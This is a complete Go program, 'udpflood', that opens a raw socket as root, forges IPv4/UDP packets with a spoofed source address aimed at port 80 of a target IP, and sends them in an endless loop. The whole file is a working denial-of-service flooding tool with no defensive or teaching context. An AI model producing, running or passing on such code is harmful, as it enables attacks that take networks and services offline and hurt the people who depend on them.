package main

import (
	"errors"
	"log"
	"net"
	"os"
	"runtime"
	"syscall"

	"github.com/nhooyr/gopacket"
	"github.com/nhooyr/gopacket/layers"
)

func main() {
	log.SetPrefix("")
	log.SetFlags(0)
	if os.Geteuid() != 0 {
		log.Fatal(errors.New("please run as root"))
	}
	fd, err := syscall.Socket(syscall.AF_INET, syscall.SOCK_RAW, syscall.IPPROTO_RAW)
	check(err)
	if len(os.Args) < 2 {
		log.Fatal("usage: udpflood <ip>")
	}
	raddr := net.ParseIP(os.Args[1])
	addr := syscall.SockaddrInet4{
		Port: 0,
		Addr: to4Array(raddr),
	}
	p := packet(raddr)
	switch runtime.GOOS {
	case "darwin", "dragonfly", "freebsd", "netbsd":
		// need to set explicitly
		check(syscall.SetsockoptInt(fd, syscall.IPPROTO_IP, syscall.IP_HDRINCL, 1))
		// no need to receive anything
		check(syscall.SetsockoptInt(fd, syscall.SOL_SOCKET, syscall.SO_RCVBUF, 1))
	case "linux":
		// no need to receive anything
		check(syscall.SetsockoptInt(fd, syscall.SOL_SOCKET, syscall.SO_RCVBUF, 0))
	}
	for {
		check(syscall.Sendto(fd, p, 0, &addr))
	}
}

func packet(raddr net.IP) []byte {
	ip := &layers.IPv4{
		Version:  0x4,
		TOS:      0x4,
		TTL:      0x40,
		Protocol: layers.IPProtocolUDP,
		SrcIP:    net.ParseIP("0.0.0.1"),
		DstIP:    raddr,
	}
	udp := &layers.UDP{
		SrcPort: 0xaa47,
		DstPort: 0x50,
	}
	udp.SetNetworkLayerForChecksum(ip)
	buf := gopacket.NewSerializeBuffer()
	opts := gopacket.SerializeOptions{true, true}
	check(gopacket.SerializeLayers(buf, opts, ip, udp, gopacket.Payload([]byte("gg ez"))))
	return buf.Bytes()
}

func to4Array(raddr net.IP) (raddrb [4]byte) {
	copy(raddrb[:], raddr.To4())
	return
}

func check(err error) {
	if err != nil {
		log.Fatal(err)
	}
}
